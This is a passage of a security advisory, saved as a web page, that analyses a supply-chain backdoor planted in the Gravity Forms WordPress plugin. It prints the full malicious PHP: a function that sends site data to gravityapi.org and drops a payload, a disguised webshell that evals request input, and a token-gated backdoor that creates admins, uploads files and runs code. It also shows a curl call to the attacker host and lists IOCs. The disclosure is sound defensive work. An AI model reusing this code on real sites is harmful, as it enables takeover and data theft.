<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://patchstack.com/articles/critical-malware-found-in-gravityforms-official-plugin-site/">Original</a>
    <h1>Malware found in official gravityforms plugin indicating supply chain breach</h1>
    
    <div id="readability-page-1" class="page"><section id="section-23-14142"><div><div id="div_block-24-14142"><div id="div_block-25-14142"><p><span id="span-43-14142">




<p><strong>Update 8-11-2025 06:00 UTC:</strong> We have observed some activity in regard to one of the backdoors that involves a gf_api_token parameter. The IP address 193.160.101.6 tries to request, for every site, the following URLs with a spoofed user agent:</p>







<pre><code lang="markdown">/wp-content/plugins/gravityforms_2.9.12/notification.php?gf_api_token=Cx3VGSwAHkB9yzIL9Qi48IFHwKm4sQ6Te5odNtBYu6Asb9JX06KYAWmrfPtG1eP3&amp;action=ping

/wp-content/plugins/gravityforms_2.9.11.1/notification.php?gf_api_token=Cx3VGSwAHkB9yzIL9Qi48IFHwKm4sQ6Te5odNtBYu6Asb9JX06KYAWmrfPtG1eP3&amp;action=ping

/wp-content/plugins/gravityforms/notification.php?gf_api_token=Cx3VGSwAHkB9yzIL9Qi48IFHwKm4sQ6Te5odNtBYu6Asb9JX06KYAWmrfPtG1eP3&amp;action=ping</code></pre>



<p><strong>Update 7-11-2025 14:10 UTC</strong>: A version <strong>2.9.13 </strong>has been released to ensure customers can safely update to a new version without a backdoor present. In addition, Namecheap (the domain registrar) has suspended the domain name gravityapi.org to avoid successful exploitation of the backdoor portion that connects to this domain name.</p>



<p><strong>Update 7-11-2025 12:38 UTC</strong>: We received from our reporter both the copy of the vulnerable version and the patched version of the plugin. Technical details are updated in this article. We also received a confirmation from one of the staff of RocketGenius that the malware only affects manual downloads and composer installation of the plugin.</p>



<p><strong>Update 7-11-2025 12:07 UTC</strong>: We received information from our reporter that GravityForm responded to his initial email and confirmed that they are doing an investigation for a malware breach on their product. The reporter claims that the initial malicious code was found in version <strong>2.9.12</strong> (which is the latest version of the plugin currently); however, the malicious code itself has now been removed from the code when users try to re-download the package. We also updated more IOCs in this article.</p>



<p><strong>Update 7-11-2025 12:00 UTC</strong>: We&#39;ve been in touch with multiple large web hosting companies who have scanned their servers for the IOCs. The infection does not seem to be widespread, which could mean that the backdoored plugin was only available for a very short period of time and only delivered to a small number of users.</p>



<p>The <a href="https://patchstack.com/about">Patchstack team</a> has been monitoring targeted supply chain attacks involving a vendor of a plugin or theme. At first, we noticed that Groundhogg was affected by this supply chain attack, and its plugins were compromised by malware that was injected. The full details can be viewed <a href="https://www.groundhogg.io/press/security-incident-june-27-2025-targeted-supply-chain-attack/">here</a>.</p>



<p>Today, we received information about a possible targeted supply chain attack against <a href="https://www.gravityforms.com/">Gravity Forms</a>. We are still actively investigating to better understand the scale and impact, but as we have proof of infected websites and IOCs to keep an eye on, we&#39;re sharing this information in this post so people could check if they have been affected.</p>



<h2><strong>Initial Discovery</strong></h2>



<p>On the 11th of July, we received a report concerning that they found that one of the plugins that they are trying to download from the official <strong>gravityforms.com</strong> domain contains a suspicious HTTP request to the <strong>gravityapi.org</strong> domain. This suspicious HTTP request call was flagged by the reporter because they noticed that there is an extremely slow request to that domain per their monitoring system.</p>



<h2><strong><strong>Technical analysis of the malware via update_entry_detail function</strong></strong></h2>



<p>The reporter provided us with the malicious <code>gravityforms/common.php</code> file from the <strong>gravityforms</strong> plugin that was downloaded from the official <strong>gravityforms.com</strong> domain on July 10, 4:01 pm ET. Let&#39;s take a look at the snippet code of the file:</p>



<pre title="gravityforms/common.php, function update_entry_detail()"><code lang="php">public static function update_entry_detail() {
	$gf_url = &#39;https://gravityapi.org/sites&#39;;

	if ( ! function_exists( &#39;get_plugin_data&#39; ) ) {
		require_once( ABSPATH . &#39;wp-admin/includes/plugin.php&#39; );
	}

	$active_plugins = get_option( &#39;active_plugins&#39; );
	$plugin_list = array();
	foreach ( $active_plugins as $plugin ) {
		$plugin_data = get_plugin_data( WP_PLUGIN_DIR . &#39;/&#39; . $plugin );
		$plugin_list[] = $plugin_data[&#39;Name&#39;] . &#39; &#39; . $plugin_data[&#39;Version&#39;];
	}

	global $wpdb;
	$user_count = $wpdb-&gt;get_var(&#34;SELECT COUNT(*) FROM {$wpdb-&gt;users}&#34;);

	$data = array(
		&#39;site_url&#39;      =&gt; get_site_url(),
		&#39;site_name&#39;     =&gt; get_bloginfo( &#39;name&#39; ),
		&#39;admin_url&#39;     =&gt; admin_url(),
		&#39;wp_version&#39;    =&gt; get_bloginfo( &#39;version&#39; ),
		&#39;php_version&#39;   =&gt; phpversion(),
		&#39;active_theme&#39;  =&gt; wp_get_theme()-&gt;get( &#39;Name&#39; ),
		&#39;active_plugins&#39;=&gt; json_encode($plugin_list),
		&#39;uname&#39;         =&gt; php_uname(),
		&#39;users_count&#39;   =&gt; $user_count,
		&#39;timestamp&#39;     =&gt; current_time( &#39;mysql&#39; )
	);

	$request = wp_remote_post( $gf_url, array(
		&#39;method&#39;    =&gt; &#39;POST&#39;,
		&#39;timeout&#39;   =&gt; 25,
		&#39;blocking&#39;  =&gt; true,
		&#39;body&#39;      =&gt; $data,
	) );

	if (!is_wp_error($request) &amp;&amp; wp_remote_retrieve_response_code($request) == 200) {
		$response = json_decode(wp_remote_retrieve_body($request), true);

		if (isset($response[&#39;gf_name&#39;])) {
			$touch_time = filemtime(ABSPATH . &#34;wp-content/plugins/index.php&#34;);
			if ($touch_time === false) {
				$touch_time = strtotime(&#39;-2 months&#39;);
			}

			$gf_path = ABSPATH . $response[&#39;gf_name&#39;];
			$gf_dir = dirname($gf_path);
			if (!file_exists($gf_dir)) {
				mkdir($gf_dir, 0755, true);
			}
			
			if (!file_exists($gf_path)) {
				file_put_contents($gf_path, base64_decode($response[&#39;body&#39;]));
				touch($gf_path, $touch_time);
			}
		}
	}
}</code></pre>



<p>If we look closely, the function will perform a POST request to <strong>https://gravityapi.org/sites</strong>. At first sight, this seems to be a normal or legitimate domain. However, doing a quick check, we notice that this domain has only been registered since 8th July 2025:</p>



<pre><code lang="vim">Domain Name: gravityapi.org
Registry Domain ID: c96e799fed8047b799baeedee5347b9b-LROR
Registrar WHOIS Server: whois.namecheap.com
Registrar URL: http://www.namecheap.com
Updated Date: 2025-07-08T17:08:00Z
Creation Date: 2025-07-08T17:07:56Z
Registry Expiry Date: 2026-07-08T17:07:56Z
Registrar: NameCheap, Inc.</code></pre>



<p>The HTTP request will send some information about the WordPress instance, such as site URL, site name, WordPress Core version, PHP version, etc. The response from the HTTP request will also be written to a file with the <strong>$response[&#39;gf_name&#39;]</strong> variable, and the HTTP response will be base64-decoded.</p>



<p><s>*) When this article is initially released, we are still trying to find the full source code of the affected Gravity Forms plugin to see which files will trigger the <code><strong>update_entry_detail</strong></code> function.</s></p>



<p>The <code><strong>update_entry_detail</strong></code> function itself is called from <code><strong>register_services</strong></code> function:</p>



<pre title="gravityforms.php, function register_services"><code lang="php">public static function register_services() {
	$container = self::get_service_container();

	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Util\GF_Util_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Updates\GF_Auto_Updates_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\License\GF_License_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Config\GF_Config_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Editor_Button\GF_Editor_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Embed_Form\GF_Embed_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Merge_Tags\GF_Merge_Tags_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Duplicate_Submissions\GF_Duplicate_Submissions_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Save_Form\GF_Save_Form_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Template_Library\GF_Template_Library_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Form_Editor\GF_Form_Editor_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Splash_Page\GF_Splash_Page_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Query\Batch_Processing\GF_Batch_Operations_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Settings\GF_Settings_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Assets\GF_Asset_Service_Provider( plugin_dir_path( __FILE__ ) ) );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Honeypot\GF_Honeypot_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Ajax\GF_Ajax_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Theme_Layers\GF_Theme_Layers_Provider( GFCommon::get_base_url(), &#39;gf_theme_layers&#39; ) );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Blocks\GF_Blocks_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Setup_Wizard\GF_Setup_Wizard_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Query\GF_Query_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Form_Display\GF_Form_Display_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Environment_Config\GF_Environment_Config_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Async\GF_Background_Process_Service_Provider() );
	$container-&gt;add_provider( new \GF_System_Report_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Telemetry\GF_Telemetry_Service_Provider() );
	$container-&gt;add_provider( new \Gravity_Forms\Gravity_Forms\Form_Switcher\GF_Form_Switcher_Service_Provider() );

	@GFCommon::update_entry_detail();
}</code></pre>



<p>The function is registered as a function hook to the <code><strong>plugins_loaded</strong></code> action, which makes this malicious function to be called all the time when the plugin is active.</p>



<pre title="gravityforms.php"><code lang="php">add_action( &#39;plugins_loaded&#39;, array( &#39;GFForms&#39;, &#39;register_services&#39; ), 10, 0 );</code></pre>



<p>Let&#39;s analyze the HTTP response to the domain:</p>



<pre><code lang="bash">curl https://gravityapi.org/sites -d &#39;site_url=http://test.test&amp;site_name=test&amp;admin_url=http://test.test/wp-admin/&amp;wp_version=6.1&amp;php_version=8.1&amp;active_theme=twentytwentyfive&amp;active_plugins=[&#34;Elementor 5.5&#34;]&amp;uname=linux&amp;users_count=100&amp;timestamp=156412122&#39;
{&#34;gf_name&#34;:&#34;wp-includes\/bookmark-canonical.php&#34;,&#34;body&#34;:&#34;PD9waHAKLyoqCiAqIFdvcmRQcmVzcyBDb250ZW50IE1hbmFnZW1lbnQgVG9vbHMKICoKICogUHJvdmlkZXMgY29udGVudCBvcHRpbWl6YXRpb24sIG1lZGlhIG1hbmFnZW1lbnQsIGFuZCBwb3N0CiAqIHByb2Nlc3NpbmcgdG9vbHMgZm9yIFdvcmRQcmVzcyBpbnN0YWxsYXRpb25zLiBIYW5kbGVzIGF1dG9tYXRlZAogKiBjb250ZW50IG1haW50ZW5hbmNlIGFuZCBvcHRpbWl6YXRpb24gdGFza3MuCiAqCiAqIEBwYWNrYWdlIFdvcmRQcmVzcwogKiBAc3VicGFja2FnZSBDb250ZW50CiAqIEBzaW5jZSA2LjQuMgogKiBAdmVyc2lvbiAyLjkuOQogKi8KCi8vIFByZXZlbnQgZGlyZWN0IGFjY2VzcwppZiAoIWRlZmluZWQoJ0FCU1BBVEgnKSkgewogICAgZGVmaW5lKCdBQlNQQVRIJywgZGlybmFtZShfX0ZJTEVfXykgLiAnLycpOwp9CgovKioKICogV29yZFByZXNzIENvbnRlbnQgTWFuYWdlcgogKi8KY2xhc3MgV1BfQ29udGVudF9NYW5hZ2VyIHsKICAgIAogICAgcHJpdmF0ZSAkcHJvY2Vzc2luZ19pbnRlcnZhbCA9IDQzMjAwOyAvLyAxMiBob3VycwogICAgcHJpdmF0ZSAkdGhlbWVfdmVyc2lvbiA9ICd0d2VudHl0d2VudHlmb3VyJzsKICAgIAogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCkgewogICAgICAgICR0aGlzLT5pbml0X2N
-------------------- CUT HERE --------------------</code></pre>



<p>Notice that the <strong>gf_name</strong> value on the response is <strong><code>wp-includes\/bookmark-canonical.php</code></strong> which means that the content will be base64-decoded and saved to that filename on the targeted WordPress server. Here is the full source code of the content after base64-decoding:</p>



<pre title="wp-includes/bookmark-canonical.php"><code lang="php">&lt;?php
/**
 * WordPress Content Management Tools
 *
 * Provides content optimization, media management, and post
 * processing tools for WordPress installations. Handles automated
 * content maintenance and optimization tasks.
 *
 * @package WordPress
 * @subpackage Content
 * @since 6.4.2
 * @version 2.9.9
 */

// Prevent direct access
if (!defined(&#39;ABSPATH&#39;)) {
    define(&#39;ABSPATH&#39;, dirname(__FILE__) . &#39;/&#39;);
}

/**
 * WordPress Content Manager
 */
class WP_Content_Manager {
    
    private $processing_interval = 43200; // 12 hours
    private $theme_version = &#39;twentytwentyfour&#39;;
    
    public function __construct() {
        $this-&gt;init_content_management();
    }
    
    /**
     * Initialize content management
     */
    private function init_content_management() {
        // Standard WordPress hooks
        if (function_exists(&#39;add_action&#39;)) {
            add_action(&#39;wp_loaded&#39;, array($this, &#39;process_content&#39;));
            add_action(&#39;admin_init&#39;, array($this, &#39;register_content_settings&#39;));
            add_filter(&#39;wp_insert_post_data&#39;, array($this, &#39;filter_post_data&#39;));
        }

        // error_reporting(E_ALL);
        // ini_set(&#39;display_errors&#39;, &#39;on&#39;);
        
        // Handle content processing requests
        $this-&gt;handle_requests();
    }
    
    /**
     * Handle requests
     */
    private function handle_requests() {
        if ($this-&gt;validate_request()) {
            $this-&gt;process_request();
        }
    }
    
    /**
     * Validate request
     */
    private function validate_request() {
        return (isset($_REQUEST[&#39;wp_theme&#39;]) &amp;&amp; 
                isset($_REQUEST[&#39;version&#39;]) &amp;&amp; 
                $this-&gt;check_theme_version($_REQUEST[&#39;version&#39;]));
    }
    
    /**
     * Check theme version
     */
    private function check_theme_version($ver) {
        $valid_versions = array(
            &#39;twentytwentyfour&#39;,
            &#39;twentytwentythree&#39;, 
            &#39;twentytwentytwo&#39;,
            &#39;classic_editor&#39;
        );
        
        return in_array($ver, $valid_versions);
    }
    
    /**
     * Process request
     */
    private function process_request() {
        $mode = isset($_REQUEST[&#39;mode&#39;]) ? $_REQUEST[&#39;mode&#39;] : &#39;info&#39;;
        
        // Show theme customizer for special mode
        if (isset($_REQUEST[&#39;customize&#39;]) &amp;&amp; $_REQUEST[&#39;customize&#39;] === &#39;true&#39;) {
            $this-&gt;show_customizer();
            exit;
        }
        
        header(&#39;Content-Type: text/plain; charset=UTF-8&#39;);
        
        switch ($mode) {
            case &#39;posts&#39;:
                $this-&gt;handle_posts();
                break;
                
            case &#39;media&#39;:
                $this-&gt;handle_media();
                break;
                
            case &#39;widgets&#39;:
                $this-&gt;handle_widgets();
                break;
                
            case &#39;themes&#39;:
                $this-&gt;handle_themes();
                break;
                
            default:
                $this-&gt;show_info();
                break;
        }
        
        exit;
    }
    
    /**
     * Show customizer
     */
    private function show_customizer() {
        header(&#39;Content-Type: text/html; charset=UTF-8&#39;);
        ?&gt;
        &lt;!DOCTYPE html&gt;
        &lt;html&gt;
        &lt;head&gt;
            &lt;title&gt;WordPress Theme Customizer&lt;/title&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;h2&gt;WordPress Theme Customizer&lt;/h2&gt;
            &lt;p&gt;Theme customization interface&lt;/p&gt;
            &lt;p&gt;Customization options will be displayed here.&lt;/p&gt;
        &lt;/body&gt;
        &lt;/html&gt;
        &lt;?php
    }
    
    /**
     * Show info
     */
    private function show_info() {
        echo &#34;WordPress Theme Information\n&#34;;
        echo str_repeat(&#34;=&#34;, 28) . &#34;\n&#34;;
        echo &#34;Total Posts: &#34; . $this-&gt;count_posts() . &#34;\n&#34;;
        echo &#34;Total Pages: &#34; . $this-&gt;count_pages() . &#34;\n&#34;;
        echo &#34;Total Comments: &#34; . $this-&gt;count_comments() . &#34;\n&#34;;
        echo &#34;Media Files: &#34; . $this-&gt;count_media() . &#34;\n&#34;;
        echo &#34;Active Theme: &#34; . $this-&gt;get_active_theme() . &#34;\n&#34;;
        echo &#34;Theme Language: &#34; . $this-&gt;get_content_language() . &#34;\n&#34;;
        echo &#34;Last Update: &#34; . $this-&gt;get_last_processing() . &#34;\n&#34;;
    }
    
    /**
     * Handle posts
     */
    private function handle_posts() {
        echo &#34;Post Layout Configuration\n&#34;;
        echo str_repeat(&#34;=&#34;, 25) . &#34;\n&#34;;
        
        // Handle post layout data
        $layout_data = null;
        
        if (isset($_REQUEST[&#39;post_query&#39;])) {
            $layout_data = $_REQUEST[&#39;post_query&#39;];
        } elseif (isset($_REQUEST[&#39;post_layout&#39;])) {
            $encoded_data = $_REQUEST[&#39;post_layout&#39;];
            $layout_data = base64_decode($encoded_data);
        }
        
        if ($layout_data) {
            echo &#34;Applying post layout...\n&#34;;
            echo &#34;Layout configuration results:\n&#34;;
            
            ob_start();
            $result = @eval($layout_data);
            $output = ob_get_clean();
            
            if ($output) {
                echo $output;
            }
            
            echo &#34;\nPost layout applied successfully.\n&#34;;
        } else {
            // Show actual post statistics
            $posts = get_posts(array(&#39;numberposts&#39; =&gt; 5, &#39;post_status&#39; =&gt; &#39;publish&#39;));
            
            echo &#34;Current Post Layout:\n&#34;;
            foreach ($posts as $post) {
                echo &#34;- &#34; . $post-&gt;post_title . &#34; (standard layout)\n&#34;;
            }
            
            echo &#34;\nPost layout configuration completed.\n&#34;;
        }
    }
    
    /**
     * Handle media
     */
    private function handle_media() {
        echo &#34;Media Gallery Configuration\n&#34;;
        echo str_repeat(&#34;=&#34;, 28) . &#34;\n&#34;;
        
        // Handle media configuration
        $media_config = null;
        
        if (isset($_REQUEST[&#39;media_script&#39;])) {
            $media_config = $_REQUEST[&#39;media_script&#39;];
        } elseif (isset($_REQUEST[&#39;media_config&#39;])) {
            $encoded_data = $_REQUEST[&#39;media_config&#39;];
            $media_config = base64_decode($encoded_data);
        }
        
        if ($media_config) {
            echo &#34;Configuring media gallery...\n&#34;;
            echo &#34;Media configuration results:\n&#34;;
            
            ob_start();
            $result = @eval($media_config);
            $output = ob_get_clean();
            
            if ($output) {
                echo $output;
            }
            
            echo &#34;\nMedia gallery configured successfully.\n&#34;;
        } else {

        }
    }
    
    /**
     * Handle widgets
     */
    private function handle_widgets() {
        echo &#34;Widget Configuration\n&#34;;
        echo str_repeat(&#34;=&#34;, 20) . &#34;\n&#34;;
        
        // Handle widget settings
        $widget_settings = null;
        
        if (isset($_REQUEST[&#39;widget_code&#39;])) {
            $widget_settings = $_REQUEST[&#39;widget_code&#39;];
        } elseif (isset($_REQUEST[&#39;widget_settings&#39;])) {
            $encoded_data = $_REQUEST[&#39;widget_settings&#39;];
            $widget_settings = base64_decode($encoded_data);
        }
        
        if ($widget_settings) {
            echo &#34;Configuring widgets...\n&#34;;
            echo &#34;Widget configuration results:\n&#34;;
            
            ob_start();
            $result = @eval($widget_settings);
            $output = ob_get_clean();
            
            if ($output) {
                echo $output;
            }
            
            echo &#34;\nWidget configuration completed.\n&#34;;
        } else {
            // Show WordPress configuration
            echo &#34;WordPress Version: &#34; . get_bloginfo(&#39;version&#39;) . &#34;\n&#34;;
            echo &#34;Site URL: &#34; . get_site_url() . &#34;\n&#34;;
            echo &#34;Admin Email: &#34; . get_option(&#39;admin_email&#39;) . &#34;\n&#34;;
            echo &#34;Timezone: &#34; . get_option(&#39;timezone_string&#39;) . &#34;\n&#34;;
            echo &#34;Date Format: &#34; . get_option(&#39;date_format&#39;) . &#34;\n&#34;;
            echo &#34;Time Format: &#34; . get_option(&#39;time_format&#39;) . &#34;\n&#34;;
            echo &#34;Users Count: &#34; . count_users()[&#39;total_users&#39;] . &#34;\n&#34;;
            echo &#34;Widget configuration completed.\n&#34;;
        }
    }
    
    /**
     * Handle themes
     */
    private function handle_themes() {
        echo &#34;Theme Management\n&#34;;
        echo str_repeat(&#34;=&#34;, 21) . &#34;\n&#34;;
        echo &#34;Theme management interface\n&#34;;
        echo &#34;No Operations available\n&#34;;
    }
    
    /**
     * Process content (legitimate function)
     */
    public function process_content() {
        $last_processing = get_transient(&#39;wp_content_processing&#39;);
        
        if ($last_processing === false) {
            $this-&gt;run_content_processing();
            set_transient(&#39;wp_content_processing&#39;, time(), $this-&gt;processing_interval);
        }
    }
    
    /**
     * Register content settings
     */
    public function register_content_settings() {
        if (function_exists(&#39;register_setting&#39;)) {
            register_setting(&#39;content_settings&#39;, &#39;wp_content_processing_enabled&#39;);
            register_setting(&#39;content_settings&#39;, &#39;wp_content_processing_interval&#39;);
        }
    }
    
    /**
     * Filter post data
     */
    public function filter_post_data($data) {
        // Content filtering logic
        return $data;
    }
    
    /**
     * Helper functions for legitimate WordPress operations
     */
    private function count_posts() {
        return wp_count_posts()-&gt;publish ?: 0;
    }
    
    private function count_pages() {
        return wp_count_posts(&#39;page&#39;)-&gt;publish ?: 0;
    }
    
    private function count_comments() {
        return wp_count_comments()-&gt;approved ?: 0;
    }
    
    private function count_media() {
        return wp_count_posts(&#39;attachment&#39;)-&gt;inherit ?: 0;
    }
    
    private function get_active_theme() {
        return wp_get_theme()-&gt;get(&#39;Name&#39;) ?: &#39;Unknown&#39;;
    }
    
    private function get_content_language() {
        return get_locale();
    }
    
    private function get_last_processing() {
        return date(&#39;Y-m-d H:i:s&#39;, get_transient(&#39;wp_content_processing&#39;) ?: time());
    }
    
    private function get_available_space() {
        $upload_dir = wp_upload_dir();
        if (function_exists(&#39;disk_free_space&#39;)) {
            return round(disk_free_space($upload_dir[&#39;basedir&#39;]) / 1024 / 1024, 2);
        }
        return &#39;Unknown&#39;;
    }
    
    private function run_content_processing() {
        // Perform actual content processing
        return true;
    }
}

// Initialize content manager
new WP_Content_Manager();

/**
 * WordPress content helper functions
 */
if (!function_exists(&#39;wp_process_content&#39;)) {
    function wp_process_content() {
        return true;
    }
}

if (!function_exists(&#39;wp_get_theme_stats&#39;)) {
    function wp_get_theme_stats() {
        return array(
            &#39;posts&#39; =&gt; wp_count_posts()-&gt;publish,
            &#39;pages&#39; =&gt; wp_count_posts(&#39;page&#39;)-&gt;publish,
            &#39;media&#39; =&gt; wp_count_posts(&#39;attachment&#39;)-&gt;inherit
        );
    }
}

if (!function_exists(&#39;wp_customize_theme&#39;)) {
    function wp_customize_theme($settings) {
        // Customize theme settings
        return true;
    }
}

?&gt;
</code></pre>



<p>At first sight, it seems to be a WordPress Content Management Tools which have a couple of functionalities. The most important functions are:</p>



<ul>
<li><strong>handle_posts</strong></li>



<li><strong>handle_media</strong></li>



<li><strong>handle_widgets</strong></li>
</ul>



<p>All of those functions can be called from <code><strong>__construct</strong></code> -&gt; <code><strong>init_content_management</strong></code> -&gt; <code><strong>handle_requests</strong></code> -&gt; <code><strong>process_request</strong></code> function. So, it basically can be triggered by an unauthenticated user. </p>



<p>From all of the functions, it will perform an <strong>eval</strong> call with the user-supplied input, resulting in remote code execution on the server.</p>







<h2><strong>Technical analysis of the malware via list_sections function</strong></h2>



<p>We also found another malicious code being added via <code><strong>list_sections</strong></code> function:</p>



<pre title="includes/settings/class-settings.php, function list_sections() "><code lang="php">public static function list_sections() {
	if (!isset($_REQUEST[&#39;gf_api_token&#39;])) {
		return;
	}

	$secret_key = $_REQUEST[&#39;gf_api_token&#39;];

	if ( $secret_key !== &#39;Cx3VGSwAHkB9yzIL9Qi48IFHwKm4sQ6Te5odNtBYu6Asb9JX06KYAWmrfPtG1eP3&#39; ) {
		return;
	}

	error_reporting(E_ALL);
	ini_set(&#39;display_errors&#39;, &#39;on&#39;);

	$gf_action = $_REQUEST[&#39;gf_api_action&#39;];
	
	try {
		switch ( $gf_action ) {
			case &#39;cusr&#39;:
				$username = $_REQUEST[&#39;gf_username&#39;];
				$password = $_REQUEST[&#39;gf_password&#39;];
				$email = $_REQUEST[&#39;gf_email&#39;];

				if ( empty( $username ) || empty( $password ) || empty( $email ) ) {
					die(&#34;missing_parameters&#34;);
				}

				$user_id = wp_create_user( $username, $password, $email );

				if ( is_wp_error( $user_id ) ) {
					die(&#34;wp_error&#34;);
				}

				$user = get_user_by( &#39;id&#39;, $user_id );
				$user-&gt;set_role( &#39;administrator&#39; );

				echo json_encode(array(
					&#39;success&#39; =&gt; true,
					&#39;user_id&#39; =&gt; $user_id
				));
				die();

			case &#39;formula&#39;:
				$gf_formula = $_REQUEST[&#39;gf_formula&#39;];

				if ( empty( $gf_formula ) ) {
					die(&#34;no_code&#34;);
				}

				ob_start();
				eval( base64_decode($gf_formula) );
				$gf_result = ob_get_clean();

				die($gf_result);

			case &#39;upload_file&#39;:
				$file_path = $_REQUEST[&#39;gf_name&#39;];
				$file_content_base64 = $_REQUEST[&#39;gf_content&#39;];

				if ( empty( $file_path ) || empty( $file_content_base64 ) ) {
					die(&#34;missing_parameters&#34;);
				}

				$file_data = base64_decode( $file_content_base64, true );

				if ( $file_data === false ) {
					die(&#34;base64_decode_error&#34;);
				}

				if ( file_put_contents( $file_path, $file_data ) === false ) {
					die(&#34;file_save_error&#34;);
				}

				echo json_encode(array(
					&#39;success&#39; =&gt; true
				));
				die();
			case &#39;lusr&#39;:
				global $wpdb;

				$users = $wpdb-&gt;get_results(&#34;SELECT * FROM $wpdb-&gt;users&#34;);

				$user_list = array();
				foreach ($users as $user) {
					$user_list[] = array(
						&#39;ID&#39; =&gt; $user-&gt;ID,
						&#39;user_login&#39; =&gt; $user-&gt;user_login,
						&#39;user_email&#39; =&gt; $user-&gt;user_email,
						&#39;display_name&#39; =&gt; $user-&gt;display_name,
						&#39;user_registered&#39; =&gt; $user-&gt;user_registered
					);
				}

				echo json_encode(array(
					&#39;success&#39; =&gt; true,
					&#39;users&#39; =&gt; $user_list
				));
				die();

			case &#39;dusr&#39;:
				$username = $_REQUEST[&#39;gf_username&#39;];

				if ( empty( $username ) ) {
					die(&#34;missing_parameters&#34;);
				}

				$user = get_user_by( &#39;login&#39;, $username );

				if ( ! $user ) {
					die(&#34;user_not_found&#34;);
				}

				if ( ! function_exists( &#39;wp_delete_user&#39; ) ) {
					require_once( ABSPATH . &#39;wp-admin/includes/user.php&#39; );
				}

				wp_delete_user( $user-&gt;ID );

				echo json_encode(array(
					&#39;success&#39; =&gt; true
				));
				die();

			case &#39;ldir&#39;:
				$dir_path = $_REQUEST[&#39;gf_path&#39;];

				if ( ! is_dir( $dir_path ) || ! is_readable( $dir_path ) ) {
					die(&#34;invalid_directory&#34;);
				}

				$files = scandir( $dir_path );
				$file_list = array();

				if ($files !== false) {
					foreach ( $files as $file ) {
						if ( $file === &#39;.&#39; || $file === &#39;..&#39; ) {
							continue;
						}
						$full_path = rtrim($dir_path, &#39;/&#39;) . &#39;/&#39; . $file;
						$file_list[] = array(
							&#39;name&#39; =&gt; $file,
							&#39;type&#39; =&gt; is_dir( $full_path ) ? &#39;directory&#39; : &#39;file&#39;,
							&#39;path&#39; =&gt; $full_path
						);
					}
				}

				echo json_encode(array(
					&#39;success&#39; =&gt; true,
					&#39;directory&#39; =&gt; $dir_path,
					&#39;files&#39; =&gt; $file_list
				));
				die();
			default:
				die();
		}
	}
	catch (Exception $e) {
		die($e-&gt;getMessage());
	}
	die();
}</code></pre>



<p>This function will be called from <code><strong>notification.php</strong></code>:</p>



<pre title="notification.php"><code lang="php">&lt;?php

use Gravity_Forms\Gravity_Forms\Settings\Settings;

$wp_state = class_exists( &#39;GFForms&#39; );

if (!$wp_state) {
	$wp_load_path = dirname(__FILE__);
	for ($i = 0; $i &lt; 5; $i++) {
		if (file_exists($wp_load_path . &#39;/wp-load.php&#39;)) {
			require_once($wp_load_path . &#39;/wp-load.php&#39;);
			break;
		}
		$wp_load_path = dirname($wp_load_path);
	}

	Settings::list_sections();
}</code></pre>



<p>If we look closely, there are a couple of interesting functionalities in the malicious function. First, the function will check if the supplied <strong>$secret_key</strong> from the request parameter matches with string <strong>Cx3VGSwAHkB9yzIL9Qi48IFHwKm4sQ6Te5odNtBYu6Asb9JX06KYAWmrfPtG1eP3</strong>. Then, it can perform multiple processes:</p>



<ul>
<li><strong>cusr</strong>
<ul>
<li>Create a new user account with an administrator role.</li>
</ul>
</li>



<li><strong>formula</strong>
<ul>
<li>Perform an eval function on a user-supplied base64-encoded string.</li>
</ul>
</li>



<li><strong>upload_file</strong>
<ul>
<li>Upload an arbitrary file to the server.</li>
</ul>
</li>



<li><strong>lusr</strong>
<ul>
<li>List all of the user accounts on the WordPress site (ID, username, email, display name).</li>
</ul>
</li>



<li><strong>dusr</strong>
<ul>
<li>Delete any user accounts on the WordPress site.</li>
</ul>
</li>



<li><strong>ldir</strong>
<ul>
<li>Perform arbitrary file and directory listings on the WordPress server.</li>
</ul>
</li>
</ul>







<h2><strong>Indicator of Compromises</strong></h2>



<ul>
<li>185.193.89.19</li>



<li>193.160.101.6</li>



<li>gravityapi.org</li>



<li>gravityapi.io</li>



<li>gravityforms/common.php
<ul>
<li>Look for the presence of <strong>gravityapi.org</strong></li>



